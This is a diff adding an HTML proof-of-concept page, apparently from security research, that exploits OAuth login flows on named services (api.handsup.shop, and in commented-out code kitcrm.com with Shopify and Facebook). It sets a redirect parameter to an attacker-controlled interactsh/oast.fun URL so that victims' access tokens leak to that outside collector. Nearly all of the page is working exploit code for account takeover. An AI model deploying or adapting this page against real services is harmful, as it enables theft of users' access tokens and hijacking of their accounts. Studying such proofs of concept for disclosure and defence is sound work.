@@ -1,0 +1,43 @@
+<html>
+<head></head>
+<body>
+  <script>
+    window.onload = function () {
+    //   window.setTimeout(function () {
+    //     document.getElementById("token").innerHTML = "<iframe src='https://www.kitcrm.com/users/auth/shopify?shop=zh5409.myshopify.com'></iframe>";
+    //   }, 5000);
+    //   window.setTimeout(function () {
+    //     window.open('https://www.facebook.com/v2.7/dialog/oauth?client_id=372033192897621&redirect_uri=https%3A%2F%2Fwww.kitcrm.com%2Fseller/onboarding/1&response_type=code&scope=email%2Cmanage_pages%2Cread_insights%2Cads_management%2Cpublish_actions%2Cbusiness_management%2Cpublish_pages');
+    //   }, 10000);
+      finished = 0;
+      var xhttp = new XMLHttpRequest();
+      xhttp.onreadystatechange = function () {
+        if (this.readyState == 4 && this.status == 200 && this.responseText.length > 0) {
+          document.getElementById("token").innerHTML = "<b>Your access token is: <br></b>" + this.responseText;
+          alert(this.responseText);
+          finished = 1;
+        }
+      };
+      function fetchToken() {
+        
+        // xhttp.open("GET", "tokens.log?" + Math.random(), true);
+        // xhttp.send();
+        // if (finished == 1) {
+        //   clearInterval(interval);
+        // }
+      }
+      var interval = setTimeout(function () { fetchToken() }, 10000);
+    }
+    function initiateLogin() {
+        const controlled_url = document.getElementById('controlled_url').value;
+        window.open('https://api.handsup.shop/auth/facebook?identity=seller&login_page_url=' + controlled_url);
+    }
+  </script>
+    <div id="token">
+      <h3>Copy the url from the frame below to the input for the controlledUrl and press "Initiate Login with Facebook !". Your access token will be retrieved there ...</h3>
+    </div>
+    <iframe src="https://app.interactsh.com/" width="100%" height="600px"></iframe>
+
+    Controlled URL : <input id="controlled_url" name="controlled_url" value="https://dmftkmghscwxjulluncucxcc46p8nfrk9.oast.fun" style="width:600px;"><button onclick="initiateLogin()">Initiate Login with Facebook !</button>
+</body>
+</html>
